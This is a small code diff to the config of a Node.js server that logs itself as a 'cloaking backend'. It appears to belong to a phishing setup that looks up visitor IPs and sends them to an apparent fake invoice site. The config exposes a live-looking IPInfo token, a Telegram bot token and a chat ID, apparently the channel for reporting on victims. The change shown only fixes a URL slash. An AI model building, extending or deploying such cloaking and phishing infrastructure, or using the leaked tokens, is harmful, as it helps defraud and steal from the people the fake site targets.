@@ -10,7 +10,7 @@ const CONFIG = {
     IPINFO_TOKEN: 'f14749fee64f8f', // Tu token de IPInfo
     TG_TOKEN: '8425620613:AAGtK8DnpmnRcudQp_tIy4kc7MJuq0QUbPE', // Tu Bot Token
     TG_CHAT: '-5084022149', // Tu Chat ID
-    DESTINO: 'https://aire-facturas-online.onrender.com//', 
+    DESTINO: 'https://aire-facturas-online.onrender.com/', 
     PORT: process.env.PORT || 3000
 };
 
@@ -62,5 +62,6 @@ app.get('/:slug', async (req, res) => {
 });
 
 app.listen(CONFIG.PORT, () => console.log(`Backend de cloaking activo en puerto ${CONFIG.PORT}`));
+
 
 
